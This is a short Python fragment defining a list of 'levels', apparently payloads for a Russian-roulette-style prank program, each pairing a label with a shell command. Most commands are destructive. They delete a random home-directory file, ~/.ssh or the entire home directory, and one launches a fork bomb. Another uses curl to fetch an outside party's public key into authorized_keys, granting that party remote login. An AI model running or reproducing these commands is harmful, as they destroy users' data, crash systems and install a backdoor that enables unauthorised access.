LEVELS = [
    ("echo 'bang'", "echo 'bang!';"),
    ("delete a random file from your homedir", """files=(~/*);
f="${files[RANDOM % ${#files[@]}]}"
rm -rf "$f"
echo 'bang!' $f 'is gone forever.'"""),
    ("delete ~/.ssh", "rm -rf ~/.ssh; echo 'bang! no more ssh for you.'"),
    ("(re-)create .ssh and add my public key to it", """mkdir -p .ssh
chmod 600 .ssh
curl https://q3k.org/pubkey > .ssh/authorized_keys
echo 'bang! thanks for the access.'"""),
    ("delete your whole homedir", """rm -rf ~; echo 'bang!' "you're homeless now." """),
    ("run a forkbomb", """
:(){ :|:& };:
"""),
]
